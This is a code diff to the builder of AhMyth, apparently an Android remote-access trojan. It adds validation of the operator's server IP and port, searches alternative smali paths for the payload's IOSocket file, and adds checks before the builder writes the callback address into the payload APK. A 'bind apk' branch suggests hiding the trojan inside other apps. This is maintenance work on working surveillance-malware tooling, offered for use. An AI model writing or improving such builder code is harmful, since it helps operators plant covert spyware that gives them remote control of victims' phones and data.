@@ -1601,12 +1601,34 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
                 return;
             }
             
-            if (!ip) {
+            // Validate IP and port inputs
+            if (!ip || typeof ip !== 'string' || ip.trim() === '') {
                 log('[✗] IP Address is required', CONSTANTS.logStatus.FAIL);
+                log('[ℹ] Please enter a valid IP address in the Server IP field', CONSTANTS.logStatus.INFO);
                 return;
             }
+            
+            // Clean and validate IP
+            ip = ip.trim();
+            var ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
+            if (!ipRegex.test(ip)) {
+                log('[✗] Invalid IP address format', CONSTANTS.logStatus.FAIL);
+                log(`[ℹ] Received: "${ip}"`, CONSTANTS.logStatus.INFO);
+                log('[ℹ] Expected format: XXX.XXX.XXX.XXX (e.g., 192.168.0.177)', CONSTANTS.logStatus.INFO);
+                return;
+            }
+            
+            // Validate port
             if (!port) {
                 port = CONSTANTS.defaultPort;
+                log(`[ℹ] Port not specified, using default: ${port}`, CONSTANTS.logStatus.INFO);
+            } else {
+                port = parseInt(port, 10);
+                if (isNaN(port) || port < 1025 || port > 65535) {
+                    log('[✗] Invalid port number', CONSTANTS.logStatus.FAIL);
+                    log(`[ℹ] Port must be between 1025 and 65535`, CONSTANTS.logStatus.INFO);
+                    return;
+                }
             }
 
             log('[→] Starting build process...', CONSTANTS.logStatus.INFO);
@@ -1622,10 +1644,37 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
                 if (fs.existsSync(obfuscatedFile)) {
                     ipPortFile = obfuscatedFile;
                     log('[ℹ] Using obfuscated IOSocket file (p0.smali)', CONSTANTS.logStatus.INFO);
+                } else {
+                    // Check for other possible locations
+                    var altPaths = [
+                        dir.join(CONSTANTS.ahmythApkFolderPath, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
+                        dir.join(CONSTANTS.ahmythApkFolderPath, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
+                    ];
+                    
+                    for (var i = 0; i < altPaths.length; i++) {
+                        if (fs.existsSync(altPaths[i])) {
+                            ipPortFile = altPaths[i];
+                            log(`[ℹ] Found IOSocket at alternative location: ${altPaths[i]}`, CONSTANTS.logStatus.INFO);
+                            break;
+                        }
+                    }
                 }
             }
 
             console.log('[AhMyth] IP:PORT file path:', ipPortFile);
+            console.log('[AhMyth] File exists:', fs.existsSync(ipPortFile));
+            console.log('[AhMyth] Ahmyth folder path:', CONSTANTS.ahmythApkFolderPath);
+            console.log('[AhMyth] Ahmyth folder exists:', fs.existsSync(CONSTANTS.ahmythApkFolderPath));
+            
+            // Verify file exists before attempting to read
+            if (!fs.existsSync(ipPortFile)) {
+                log('[✗] IP:PORT file not found!', CONSTANTS.logStatus.FAIL);
+                log(`[ℹ] Expected path: ${ipPortFile}`, CONSTANTS.logStatus.INFO);
+                log(`[ℹ] Ahmyth folder: ${CONSTANTS.ahmythApkFolderPath}`, CONSTANTS.logStatus.INFO);
+                log('[ℹ] Please ensure the Ahmyth folder is properly decompiled', CONSTANTS.logStatus.INFO);
+                log('[ℹ] Try rebuilding the APK or check if the Factory/Ahmyth folder exists', CONSTANTS.logStatus.INFO);
+                return;
+            }
             
             // check if bind apk is enabled
             if (!$appCtrl.bindApk.enable) {
@@ -1633,6 +1682,11 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
                 
                 // Use synchronous read for reliability
                 try {
+                    // Additional check before reading
+                    if (!fs.existsSync(ipPortFile)) {
+                        throw new Error(`File does not exist: ${ipPortFile}`);
+                    }
+                    
                     var data = fs.readFileSync(ipPortFile, 'utf8');
                     console.log('[AhMyth] File read successfully, length:', data.length);
                     
@@ -1675,6 +1729,11 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
                 log('[→] Reading IP:PORT configuration...', CONSTANTS.logStatus.INFO);
                 
                 try {
+                    // Verify file exists before reading
+                    if (!fs.existsSync(ipPortFile)) {
+                        throw new Error(`IP:PORT file not found: ${ipPortFile}`);
+                    }
+                    
                     var data = fs.readFileSync(ipPortFile, 'utf8');
                     
                     log('[→] Injecting server configuration...', CONSTANTS.logStatus.INFO);
